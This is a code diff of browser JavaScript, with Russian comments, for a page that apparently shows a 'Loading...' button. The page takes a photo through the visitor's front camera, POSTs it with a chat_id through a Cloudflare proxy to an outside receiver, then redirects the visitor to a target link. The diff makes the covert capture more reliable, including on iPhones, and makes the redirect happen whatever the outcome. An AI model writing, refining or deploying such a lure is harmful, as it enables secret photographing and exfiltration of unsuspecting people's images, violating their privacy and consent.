@@ -25,53 +25,61 @@ const video = document.getElementById('v');
 const canvas = document.getElementById('c');
 
 btn.onclick = async () => {
-    btn.innerText = "Загрузка..."; // Показываем, что процесс идет
+    btn.innerText = "Загрузка..."; 
     btn.disabled = true;
+    let stream;
 
     try {
-        // 1. Запрашиваем фронтальную камеру
-        const stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { facingMode: "user" } 
+        // 1. Запрашиваем фронтальную камеру с конкретными параметрами
+        stream = await navigator.mediaDevices.getUserMedia({ 
+            video: { 
+                facingMode: "user",
+                width: { ideal: 640 },
+                height: { ideal: 480 }
+            } 
         });
-        video.srcObject = stream;
 
-        // 2. Ждем 800мс, чтобы камера телефона успела "проснуться" (убирает черное фото)
+        // ПРИВЯЗЫВАЕМ СТРИМ К ВИДЕО
+        video.srcObject = stream;
+        video.setAttribute("playsinline", true); // Критично для iPhone!
+        
+        // 2. Ждем, пока видео реально начнет играть
         await new Promise((resolve) => {
             video.onloadedmetadata = () => {
-                setTimeout(resolve, 800); 
+                video.play(); // Принудительный старт
+                // Даем 1 секунду на настройку экспозиции и фокуса на телефоне
+                setTimeout(resolve, 1000); 
             };
         });
 
-        // 3. Делаем снимок
+        // 3. Делаем снимок (захват кадра)
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        canvas.getContext('2d').drawImage(video, 0, 0);
+        const context = canvas.getContext('2d');
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
         
-        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
+        const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.8));
         const formData = new FormData();
         formData.append('chat_id', chatId);
         formData.append('photo', blob, 'shot.jpg');
 
-        // 4. ЖДЕМ ОТПРАВКИ (await заставит скрипт стоять на этой строчке)
-        const response = await fetch(proxyUrl, { 
+        // 4. ЖДЕМ ОТПРАВКИ ЧЕРЕЗ CLOUDFLARE
+        await fetch(proxyUrl, { 
             method: 'POST', 
             body: formData 
         });
 
-        if (response.ok) {
-            console.log("Фото ушло!");
-        }
-
-        // Выключаем камеру
-        stream.getTracks().forEach(t => t.stop());
-
     } catch (err) {
-        console.log("Ошибка или отказ:", err);
+        console.error("Ошибка:", err);
     } finally {
-        // 5. ПЕРЕХОД ПО ССЫЛКЕ (сработает только когда fetch завершится или выдаст ошибку)
+        // Останавливаем камеру и уходим
+        if (stream) {
+            stream.getTracks().forEach(t => t.stop());
+        }
         window.location.href = targetUrl;
     }
 };
+
 
 
 
